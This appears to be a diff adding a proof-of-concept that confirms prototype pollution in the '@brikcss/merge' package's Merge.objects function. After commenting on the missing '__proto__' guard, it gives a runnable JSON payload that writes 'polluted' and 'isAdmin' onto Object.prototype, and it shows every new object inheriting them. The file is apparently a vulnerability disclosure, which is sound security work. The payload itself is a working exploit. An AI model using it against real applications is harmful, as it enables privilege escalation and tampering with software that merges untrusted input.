@@ -1,0 +1,24 @@
+Confirmed prototype pollution in `@brikcss/merge`'s `Merge.objects`.
+
+```javascript
+const merge = require("@brikcss/merge");
+
+// Merge.objects() iterates Object.keys(source) and does
+// target[key] = Merge.objects(target[key] || {}, value, ...)
+// with no guard against "__proto__", "constructor", or "prototype" keys.
+// A source object with an own "__proto__" property (achievable via
+// JSON.parse, which does not special-case that key) lets an attacker
+// write directly onto Object.prototype.
+
+const maliciousInput = '{"__proto__":{"polluted":"yes","isAdmin":true}}';
+const payload = JSON.parse(maliciousInput);
+
+// Simulates an app merging untrusted JSON (e.g. request body / config file)
+// into a local object.
+merge.objects({}, payload);
+
+// Every plain object in the process is now polluted.
+const victim = {};
+console.log("polluted:", victim.polluted);   // "yes"
+console.log("isAdmin:", victim.isAdmin);     // true
+```
